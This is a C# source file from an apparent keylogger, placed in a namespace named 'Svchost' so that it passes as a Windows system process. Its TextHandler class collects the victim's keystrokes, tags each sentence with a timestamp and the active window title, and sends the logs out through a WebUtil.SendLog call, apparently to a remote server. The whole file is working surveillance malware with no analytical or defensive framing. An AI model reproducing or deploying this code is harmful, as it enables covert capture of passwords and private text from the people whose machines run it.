using System;
using System.Runtime.InteropServices;
using System.Collections.Generic;
using System.Text;
using System.Threading.Tasks;
using System.IO;
using System.Windows.Forms;
using Svchost.Net;

namespace Svchost.TextHandling
{
    public class TextHandler
    {
        private string currentSentence;
        private string lastWindowName;
        private string sessionName;
        private List<Keys> presedKeys;
        private Keyboard keyboard;

        public TextHandler(string sessionName)
        {
            this.sessionName = sessionName;
            currentSentence = "";
            lastWindowName = GetActiveWindowTitle();
            presedKeys = new List<Keys>();
            keyboard = new Keyboard();

            WebUtil.SendLog(sessionName, "################ SYSTEM - Starting");

            /*this.timerKeyMine = new System.Timers.Timer();
            this.timerKeyMine.Enabled = true;
            this.timerKeyMine.Elapsed += new System.Timers.ElapsedEventHandler(this.timerKeyMine_Elapsed);
            this.timerKeyMine.Interval = 10;*/
        }

        public void pressedKey(Keys code)
        {
            //Window change
            if (lastWindowName != GetActiveWindowTitle())
            {
                sendSentence();
                lastWindowName = GetActiveWindowTitle();
            }

            //Return key pressed
            if (code == Keys.Return || code == Keys.Tab)
                sendSentence();
            else if (code == Keys.Back)
            {
                if (currentSentence.Length > 0)
                    currentSentence = currentSentence.Remove(currentSentence.Length - 1);
            }
            else
                currentSentence += keyboard.keyActivity(code, true);
        }

        public void releasedKey(Keys code)
        {
            currentSentence += keyboard.keyActivity(code, false);
        }

        private void sendSentence()
        {
            if(currentSentence.Length > 1)
            {
                currentSentence = currentSentence.Replace("Â", string.Empty);
                currentSentence = DateTime.Now.ToString("MM/dd/yyyy h:mm tt") + " || " + lastWindowName + " || " + currentSentence;
                //Console.WriteLine(currentSentence);
                WebUtil.SendLog(sessionName, currentSentence);
            }

            currentSentence = "";
        }
        
        private string GetActiveWindowTitle()
        {
            const int nChars = 256;
            StringBuilder Buff = new StringBuilder(nChars);
            IntPtr handle = GetForegroundWindow();

            if (GetWindowText(handle, Buff, nChars) > 0)
            {
                return Buff.ToString();
            }
            return null;
        }

        [DllImport("user32.dll")]
        static extern IntPtr GetForegroundWindow();

        [DllImport("user32.dll")]
        static extern int GetWindowText(IntPtr hWnd, StringBuilder text, int count);

        [DllImport("User32.dll")]
        private static extern short GetAsyncKeyState(
        System.Windows.Forms.Keys vKey); // Keys enumeration

        [DllImport("User32.dll")]
        private static extern short GetAsyncKeyState(
            System.Int32 vKey);
    }
}
